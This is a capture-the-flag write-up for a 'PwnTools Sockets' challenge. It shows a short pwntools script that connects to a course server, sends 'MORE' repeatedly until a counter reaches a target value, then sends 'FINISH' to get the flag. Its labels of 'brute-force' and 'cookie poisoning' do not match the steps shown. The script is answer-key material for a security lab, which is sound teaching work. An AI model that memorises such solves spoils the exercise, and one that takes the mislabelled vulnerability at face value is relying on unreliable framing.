# Challenge `PwnTools Sockets` Writeup

- Vulnerability:
    - Endpoint is vulnerable to brute-force attack and cookie poisoning

- Where:
    - `MORE\n` endpoint

- Impact:
    - Allows to find the server guess by repeated messages

## Steps to reproduce

### Step 1: Establish connection with remote server

```python
from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23055
s = remote(SERVER, PORT, timeout=9999)
```

### Step 2: Get target value and current value
We need to read the the servers message until `get to ` is found to get the target value. Then we need to read until `CURRENT = ` is found to get the current value.

```python
s.recvuntil(b'get to ')
target = s.recvuntil(b'.')[:-1].decode()

s.recvuntil(b'CURRENT = ')
curr = s.recvuntil(b'.')[:-1].decode()
```
### Step 3: Send `MORE\n` messages until the target value is reached
```python
while curr != target:
    s.sendline('MORE'.encode('utf-8'))
    s.recvuntil(b'CURRENT = ')
    curr = s.recvuntil(b'.')[:-1].decode()
```

### Step 4: Get flag
Once the target value is reached, send message `FINISH\n` to get the flag.

```python
s.sendline('FINISH'.encode('utf-8'))
s.recvuntil(b'GREAT JOB: ')
flag = s.recvuntil(b'\n')[:-1].decode()
log.info("Flag: " + flag)
```

## Implementation

The full implementation can be found [here](pwntools-sockets.py).